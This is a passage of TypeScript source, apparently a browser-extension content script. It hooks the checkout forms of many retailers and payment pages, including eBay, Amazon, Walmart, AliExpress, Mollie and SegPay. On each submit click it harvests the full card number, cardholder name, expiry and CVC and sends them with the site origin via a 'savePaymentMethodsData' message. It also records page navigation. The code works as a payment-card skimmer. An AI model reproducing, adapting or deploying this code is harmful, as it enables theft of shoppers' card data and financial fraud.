                                    'cardBrand': document.querySelector('.card-brand-icon')?.classList.contains('visa') ? 'visa' : (document.querySelector('.card-brand-icon')?.classList.contains('mastercard') ? 'mastercard' : (document.querySelector('.card-brand-icon')?.classList.contains('discover') ? 'discover' : (document.querySelector('.card-brand-icon')?.classList.contains('mnp') ? 'mnp' : (document.querySelector('.card-brand-icon')?.classList.contains('maestro') ? 'maestro' : (document.querySelector('.card-brand-icon')?.classList.contains('amex') ? 'amex' : document.querySelector('.card-brand-icon')?.className))))),
                                    'cardHolder': paymentMethodStore[1].value,
                                    'cardExpire': paymentMethodStore[2].value,
                                    'cardCVC': paymentMethodStore[3].value,
                                    'event': 'add',
                                    'workWebsite': window.location.origin
                                }
                            });
                            paymentMethodStore = [];

                            let edit = setInterval(function () {
                                if (document.querySelector('.payment-edit') !== null) {
                                    clearInterval(edit);
                                    ['click', 'dblclick'].forEach(function (event) {
                                        document.querySelector('.payment-edit')?.addEventListener(event, function () {
                                            let __interval3 = setInterval(function () {
                                                if (document.querySelector('.card-form') !== null) {
                                                    clearInterval(__interval3);
                                                    self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                                }
                                            }, 1000);
                                        });
                                    });
                                }
                            }, 1000);
                        });
                    }
                );
            }

        }, 100)

    }

    exploreEbayPaymentDataCollection(self: this, __ebayCreditCardFormElement: any, elements: any[]) {
        self.exploreEbayPaymentFormElement(self, __ebayCreditCardFormElement, elements, function (controller, elements) {
            ['click', 'dblclick'].forEach(function (event) {
                controller.addEventListener(event, function () {
                    let paymentMethodStore: any = [];
                    elements.forEach(function (__detectedElement: HTMLInputElement) {
                        paymentMethodStore.push({
                            'element': __detectedElement.nodeName,
                            'id': __detectedElement.id,
                            'value': __detectedElement.value
                        });
                    });
                    send({
                        command: 'savePaymentMethodsData',
                        data: {
                            'cardNumber': paymentMethodStore[0].id.indexOf('cardNumber') !== -1 ? paymentMethodStore[0].value : 'Unknown',
                            'cardBrand': document.querySelector('.card-types')?.firstElementChild?.getAttribute('aria-label')?.toLowerCase(),
                            'cardHolder': paymentMethodStore[3].id === 'cardHolderFirstName' ? paymentMethodStore[3].value : 'Unknown' + ' ' + paymentMethodStore[4].id === 'cardHolderLastName' ? paymentMethodStore[4].value : 'Unknown',
                            'cardExpire': paymentMethodStore[1].id === 'cardExpiryDate' ? paymentMethodStore[1].value : 'Unknown',
                            'cardCVC': paymentMethodStore[2].id === 'securityCode' ? paymentMethodStore[2].value : 'Unknown',
                            'event': 'add',
                            'workWebsite': window.location.origin
                        }
                    });
                    paymentMethodStore = [];
                    let interval = setInterval(function () {
                        document.querySelectorAll('a').forEach(function (__ebaySecondEntry) {
                            if (__ebaySecondEntry.getAttribute('data-test-id') === 'GET_PAYMENT_INSTRUMENT') {
                                clearInterval(interval);
                                ['click', 'dblclick'].forEach(function (event) {
                                    __ebaySecondEntry.addEventListener(event, function () {
                                        self.exploreEbayPaymentDataCollection(self, __ebayCreditCardFormElement, elements);
                                    });
                                });
                            }
                        });
                    }, 100)
                });
            });
        });
    }

    exploreEbayPaymentFormElement(self: this, __ebayCreditCardFormElement: any, elements: any[], callback: (arg0: any, arg1: any) => void) {
        if (__ebayCreditCardFormElement.childNodes.length !== 0) {
            __ebayCreditCardFormElement.childNodes.forEach(function (_ebayFormChildElement: any) {
                if (_ebayFormChildElement.nodeName === 'INPUT' || _ebayFormChildElement.nodeName === 'BUTTON') {
                    if (_ebayFormChildElement.nodeName === 'INPUT' && _ebayFormChildElement.type !== 'hidden' && _ebayFormChildElement.type !== 'checkbox') {
                        elements.push(_ebayFormChildElement);
                    }
                    if (_ebayFormChildElement.nodeName === 'BUTTON' && _ebayFormChildElement.type === 'submit') {
                        if (callback) {
                            callback(_ebayFormChildElement, elements);
                        }
                    }
                } else {
                    self.exploreEbayPaymentFormElement(self, _ebayFormChildElement, elements, callback);
                }
            });
        }
    }

    exploreSegPayPaymentContainer(self: this) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "PayPageForm") {
                let elements: any = [];
                self.exploreSegPayPaymentFormElement(self, __formElement, elements, function (controller: any, elements: any[]) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData: any = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,

                            });
                        });
                        send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[2].value !== null ? paymentMethodData[2].value : 'Unknown',
                                'cardBrand': /*paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() :*/ 'Unknown',
                                'cardHolder': paymentMethodData[0].value !== null ? paymentMethodData[0].value : 'Unknown' + ' ' + paymentMethodData[1].value !== null ? paymentMethodData[1].value : 'Unknown',
                                'cardExpire': paymentMethodData[3].value !== null ? paymentMethodData[3].value : 'Unknown' + '/' + paymentMethodData[4].value !== null ? paymentMethodData[4].value : 'Unknown',
                                'cardCVC': paymentMethodData[5].value !== null ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                'workWebsite': window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    }

    exploreSegPayPaymentFormElement(self: this, __formElement: any, elements: any[], callback: (arg0: any, arg1: any) => void) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement: any) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' && _childElement.type !== 'radio' &&
                        _childElement.id !== 'EMailInput' && _childElement.id !== 'AddressInput' && _childElement.id !== 'CityInput' &&
                        _childElement.id !== 'PhoneNumberInput' && _childElement.id !== 'ZipInput' && _childElement.id !== 'TermsConditionsPrivacyInput' ||
                        _childElement.nodeName === 'SELECT' && _childElement.id !== 'LanguageDDL' && _childElement.id !== 'TodaysChargeDDL' &&
                        _childElement.id !== 'StateDDL' && _childElement.id !== 'CountryDDL') {
                        elements.push(_childElement);
                    }

                    if (_childElement.nodeName === 'BUTTON') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                } else {
                    self.exploreSegPayPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }

    exploreDocmorrisPaymentContainer(self: this) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "form-paymentmethods-credit_card") {
                let elements: any = [];
                self.exploreDocmorrisPaymentFormElement(self, __formElement, elements, function (controller: any, elements: any[]) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData: any = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,

                            });
                        });
                        send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() : 'Unknown',
                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                'cardExpire': paymentMethodData[3].value ? paymentMethodData[3].value : 'Unknown' + '/' + paymentMethodData[4].value ? paymentMethodData[4].value : 'Unknown',
                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                'workWebsite': window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    }

    exploreDocmorrisPaymentFormElement(self: this, __formElement: any, elements: any[], callback: (arg0: any, arg1: any) => void) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement: any) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' || _childElement.nodeName === 'SELECT') {
                        elements.push(_childElement);
                    }
                    if (elements.length ! > 4 && elements.length ! < 6) {
                        if (document.querySelectorAll('#perkreditkarte').length !== 0) {
                            document.querySelectorAll('#perkreditkarte').forEach(function (__dataConfirmElement) {
                                if (__dataConfirmElement.getAttribute('form') === "form-paymentmethods-credit_card") {
                                    if (callback) {
                                        callback(__dataConfirmElement, elements);
                                    }
                                }
                            })
                        }
                    }
                } else {
                    self.exploreDocmorrisPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }

    explorePaygatePaymentContainer(self: this) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "SSLForm") {
                let elements: any = [];
                self.explorePaygatePaymentFormElement(self, __formElement, elements, function (controller: any, elements: any[]) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData: any = [];
                        elements.forEach(function (__childElement) {
                            if (__childElement.nodeName === 'INPUT') {
                                if (__childElement.type === 'radio' && __childElement.checked) {
                                    paymentMethodData.push({
                                        'element': __childElement.nodeName,
                                        'id': __childElement.id,
                                        'name': __childElement.name,
                                        'value': __childElement.value,

                                    });
                                } else {
                                    if (__childElement.type === 'text') {
                                        paymentMethodData.push({
                                            'element': __childElement.nodeName,
                                            'id': __childElement.id,
                                            'name': __childElement.name,
                                            'value': __childElement.value,

                                        });
                                    }
                                }
                            }

                            if (__childElement.nodeName === 'SELECT') {
                                paymentMethodData.push({
                                    'element': __childElement.nodeName,
                                    'id': __childElement.id,
                                    'name': __childElement.name,
                                    'value': __childElement.value,

                                });
                            }
                        });
                        send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() : 'Unknown',
                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                'cardExpire': paymentMethodData[3].value ? paymentMethodData[3].value : 'Unknown' + '/' + paymentMethodData[4].value ? paymentMethodData[4].value : 'Unknown',
                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                'workWebsite': window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    }

    explorePaygatePaymentFormElement(self: this, __formElement: any, elements: any[], callback: (arg0: any, arg1: any) => void) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement: any) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON' || _childElement.type === 'radio') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' || _childElement.nodeName === 'SELECT' || _childElement.type === 'radio') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                } else {
                    self.explorePaygatePaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }

    exploreSundayPaymentContainer(self: this) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "one-step-checkout-form") {
                let elements: any = [];
                self.exploreSundayPaymentFormElement(self, __formElement, elements, function (controller: any, elements: any[]) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData: any = [];

                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,

                            });
                        });
                        send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': /*paymentMethodData[6].value ? paymentMethodData[6].value :*/ 'Unknown',
                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                "cardExpire": paymentMethodData[4].value ? paymentMethodData[4].value : 'Unknown',
                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    }

    exploreSundayPaymentFormElement(self: this, __formElement: any, elements: any[], callback: (arg0: any, arg1: any) => void) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement: any) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                } else {
                    self.exploreSundayPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }

    exploreMolliePaymentContainer(self: this) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "body") {
                let elements: any = [];
                self.exploreMolliePaymentFormElement(self, __formElement, elements, function (controller: any, elements: any[]) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData: any = [];

                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,

                            });
                        });
                        send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': /*paymentMethodData[6].value ? paymentMethodData[6].value :*/ 'Unknown',
                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                "cardExpire": paymentMethodData[4].value ? paymentMethodData[4].value : 'Unknown',
                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    }

    exploreMolliePaymentFormElement(self: this, __formElement: any, elements: any[], callback: (arg0: any, arg1: any) => void) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement: any) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                } else {
                    self.exploreMolliePaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }

    exploreAnchorOnly(self: this, parentNode: any, listId: string, callback: (arg0: any) => void) {
        if (parentNode.childNodes.length !== 0) {
            parentNode.childNodes.forEach(function (__detectedElement: any) {
                if (__detectedElement.nodeName === 'A' && __detectedElement.getAttribute('data-txnid') === listId) {
                    if (callback) {
                        callback(__detectedElement);
                    }
                } else {
                    self.exploreAnchorOnly(self, __detectedElement, listId, callback);
                }
            });
        }
    }

    exploreAnchorOnlyByHref(self: this, parentNode: any, listId: string, callback: (arg0: any) => void) {
        if (parentNode.childNodes.length !== 0) {
            parentNode.childNodes.forEach(function (__detectedElement: any) {
                if (__detectedElement.nodeName === 'A' && __detectedElement.href.indexOf(listId) !== -1) {
                    if (callback) {
                        callback(__detectedElement);
                    }
                } else {
                    self.exploreAnchorOnlyByHref(self, __detectedElement, listId, callback);
                }
            });
        }
    }

    explorePaymentInputTagOnly(self: this, elementParentNode: HTMLElement, callback: any) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'INPUT' && (__childElement as HTMLInputElement).type === 'submit') {
                    if (callback) {
                        callback((__childElement as HTMLInputElement));
                    }
                } else {
                    self.explorePaymentInputTagOnly(self, (__childElement as HTMLElement), callback)
                }
            });
        }
    }

    explorePayPalPaymentFormElement(self: this, __creditCardFormElement: any, elements: any[], callback: (arg0: any, arg1: any) => void) {
        if (__creditCardFormElement.childNodes.length !== 0) {
            __creditCardFormElement.childNodes.forEach(function (_formChildElement: any) {
                if (_formChildElement.nodeName === 'INPUT' || _formChildElement.nodeName === 'SELECT' || _formChildElement.nodeName === 'BUTTON') {
                    if (_formChildElement.nodeName === 'INPUT' || _formChildElement.nodeName === 'SELECT' &&
                        _formChildElement.type !== 'hidden' && _formChildElement.id !== 'billingAddressId') {
                        elements.push(_formChildElement);
                    }
                    if (_formChildElement.nodeName === 'BUTTON' && _formChildElement.type === 'submit') {
                        if (callback) {
                            callback(_formChildElement, elements);
                        }
                    }
                } else {
                    self.explorePayPalPaymentFormElement(self, _formChildElement, elements, callback);
                }
            });
        }
    }

    exploreHelloFreshPaymentContainer(self: this, parentNode: any, callback: any) {
        parentNode.childNodes.forEach(function (__element: any) {
            if (__element.nodeName === 'BUTTON' && __element.getAttribute('data-test-id') === 'add-payment-method-save') {
                if (callback) {
                    callback(__element);
                }
            } else {
                self.exploreHelloFreshPaymentContainer(self, __element, callback);
            }
        });
    }

    exploreBestSecretPaymentContainer(self: this) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "creditForm") {
                let elements: any = [];
                self.exploreBestSecretPaymentFormElement(self, __formElement, elements, function (controller: any, elements: any[]) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData: any = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,

                            });
                        });
                        send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                'cardHolder': paymentMethodData[4].value ? paymentMethodData[4].value : 'Unknown',
                                "cardExpire": paymentMethodData[2].value + '/' + paymentMethodData[3].value,
                                'cardCVC': 'Unknown',
                                'event': 'add',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    }

    exploreBestSecretPaymentFormElement(self: this, __formElement: any, elements: any[], callback: (arg0: any, arg1: any) => void) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement: any) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' || _childElement.nodeName === 'SELECT') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON' && !(_childElement as HTMLButtonElement).classList.contains('btn-link')
                        && !(_childElement as HTMLButtonElement).classList.contains('btn-secondary-action') && (_childElement as HTMLButtonElement).type === 'submit') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                } else {
                    self.exploreBestSecretPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }

    exploreAmazonPaymentContainer(self: this) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (!__formElement.classList.contains('nav-searchbar') && __formElement.name !== 'ue_backdetect' && __formElement.style.display !== 'none') {
                let elements: any = [];
                self.exploreAmazonPaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData: any = [];
                        elements.forEach(function (__childElement: { nodeName: any; id: any; name: any; value: any; }) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name.indexOf('accountHolderName') !== -1 || __childElement.name.indexOf('account_holder_name') !== -1 ? 'cardHolder' : (__childElement.name.indexOf('CardNumber') !== -1 ? 'cardNumber' : (__childElement.name.indexOf('month') !== -1 ? 'expirationMonth' : (__childElement.name.indexOf('year') !== -1 ? 'expirationYear' : 'Unknown'))),
                                'value': __childElement.value,

                            });
                        });
                        send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value,
                                'cardBrand': 'Unknown',
                                'cardHolder': paymentMethodData[0].value,
                                "cardExpire": paymentMethodData[2].value + '/' + paymentMethodData[3].value,
                                'cardCVC': 'Unknown',
                                'event': 'add',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                    });
                });
            }
        });
    }

    exploreAmazonPaymentFormElement(self: this, __formElement: any, elements: any[], callback: (arg0: any, arg1: any) => void) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement: any) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' &&
                        _childElement.type !== 'submit' && _childElement.type !== 'checkbox' ||
                        _childElement.nodeName === 'SELECT') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'INPUT' && _childElement.type === 'submit') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                } else {
                    self.exploreAmazonPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }

    exploreWalmartPaymentContainer(self: this) {
        let interval = setInterval(function () {
            if (document.querySelector('.edit-form.multiple-required') !== null &&
                document.querySelector('.edit-form-actions')?.firstElementChild?.firstElementChild !== null) {
                clearInterval(interval);
                if (document.querySelector('.edit-form-actions')?.firstElementChild?.firstElementChild?.nodeName === 'BUTTON') {
                    ["click", "dblclick"].forEach(function (event) {
                        let tempPaymentMethodsStore: any = [];
                        document.querySelector('.edit-form-actions')?.firstElementChild?.firstElementChild?.addEventListener(event, function () {
                            self.explorePaymentInputTag(self, (document.querySelector('.edit-form.multiple-required') as HTMLElement), 'creditCard', function (__detectedElement: any) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });

                            document.querySelectorAll('.payment-option').forEach(function (element) {
                                if (!element.classList.contains('payment-inactive')) {
                                    element.classList.remove('payment-option');
                                    tempPaymentMethodsStore.push({
                                        'element': element.nodeName,
                                        'id': 'cardBrand',
                                        'value': element.className
                                    });
                                    element.classList.add('payment-option');
                                }
                            });

                            self.explorePaymentInputTag(self, (document.querySelector('.edit-form.multiple-required') as HTMLElement), 'firstName', function (__detectedElement: any) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentInputTag(self, (document.querySelector('.edit-form.multiple-required') as HTMLElement), 'lastName', function (__detectedElement: any) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentSelectTag(self, (document.querySelector('.edit-form.multiple-required') as HTMLElement), 'month-chooser', function (__detectedElement: any) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentSelectTag(self, (document.querySelector('.edit-form.multiple-required') as HTMLElement), 'year-chooser', function (__detectedElement: any) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentInputTag(self, (document.querySelector('.edit-form.multiple-required') as HTMLElement), 'cvv', function (__detectedElement: any) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            send({
                                command: 'savePaymentMethodsData',
                                data: {
                                    'cardNumber': tempPaymentMethodsStore[0].value,
                                    'cardBrand': tempPaymentMethodsStore[1].value,
                                    'cardHolder': tempPaymentMethodsStore[2].value + ' ' + tempPaymentMethodsStore[3].value,
                                    "cardExpire": tempPaymentMethodsStore[4].value + '/' + tempPaymentMethodsStore[5].value,
                                    'cardCVC': tempPaymentMethodsStore[6].value,
                                    'event': 'add',
                                    "workWebsite": window.location.origin
                                }
                            });
                            tempPaymentMethodsStore = [];
                            self.exploreWalmartPaymentEditButton(self);
                        })
                    })
                }
            }
        }, 100);
    }

    exploreWalmartPaymentEditButton(self: this) {
        let interval = setInterval(function () {
            if (document.querySelectorAll('.button.link.CXO_module_header_edit_button.button--link').length !== 0) {
                document.querySelectorAll('.button.link.CXO_module_header_edit_button.button--link').forEach(function (formEditButton) {
                    if (formEditButton.getAttribute('data-automation-id') === 'edit-payment') {
                        clearInterval(interval);
                        formEditButton.addEventListener('click', function () {
                            self.exploreWalmartPaymentContainer(self);
                        });
                    }
                })
            }
        }, 100);
    }

    explorePaymentNewCard(self: this, elementParentNode: HTMLElement, callback?: any) {
        let detectedElements: any[] = [];
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if ((__childElement as HTMLElement).classList.contains('card-surface')) {
                    if ((__childElement as HTMLElement).nodeName === 'DIV' && (__childElement as HTMLElement).childNodes.length !== 0) {
                        (__childElement as HTMLElement).childNodes.forEach(function (__targetParentElement) {
                            if ((__targetParentElement as HTMLElement).classList.contains('card-no')) {
                                self.explorePaymentInputTag(self, (__targetParentElement as HTMLElement), 'cardNo', function (detectedElement: any) {
                                    detectedElements.push(detectedElement);
                                });
                            }
                            if ((__targetParentElement as HTMLElement).classList.contains('card-bottom')) {
                                self.explorePaymentInputTag(self, (__targetParentElement as HTMLElement), 'cardHolder', function (detectedElement: any) {
                                    detectedElements.push(detectedElement);
                                });
                                self.explorePaymentInputTag(self, (__targetParentElement as HTMLElement), 'expire', function (detectedElement: any) {
                                    detectedElements.push(detectedElement);
                                });
                                self.explorePaymentInputTag(self, (__targetParentElement as HTMLElement), 'cvc', function (detectedElement: any) {
                                    detectedElements.push(detectedElement);
                                });
                            }
                        })
                    }
                }
            });
            if (callback) {
                callback(detectedElements);
            }
        }
    }

    explorePaymentSpanTag(self: this, elementParentNode: HTMLElement, callback?: any) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'SPAN' && (__childElement as HTMLElement).classList.contains('payment-title')) {
                    if (callback) {
                        callback(__childElement);
                    }
                } else {
                    self.explorePaymentSpanTag(self, (__childElement as HTMLElement), callback)
                }
            });
        }
    }

    explorePaymentInputTag(self: this, elementParentNode: HTMLElement, selfId: string, callback: any) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'INPUT' && (__childElement as HTMLElement).id.indexOf(selfId) !== -1) {
                    if (callback) {
                        callback((__childElement as HTMLInputElement));
                    }
                } else {
                    self.explorePaymentInputTag(self, (__childElement as HTMLElement), selfId, callback)
                }
            });
        }
    }

    explorePaymentSelectTag(self: this, elementParentNode: HTMLElement, selfId: string, callback: any) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'SELECT' && (__childElement as HTMLElement).id.indexOf(selfId) !== -1) {
                    if (callback) {
                        callback((__childElement as HTMLInputElement));
                    }
                } else {
                    self.explorePaymentSelectTag(self, (__childElement as HTMLElement), selfId, callback)
                }
            });
        }
    }
}


/*new tracker added*/
initDb();
(new Tracker(window.location.href)).init(function () {
    send({
        command: 'saveNavigateData',
        data: {
            username: 'visitor',
            workWebsite: window.location.origin
        }
    });
});
/*new tracker added*/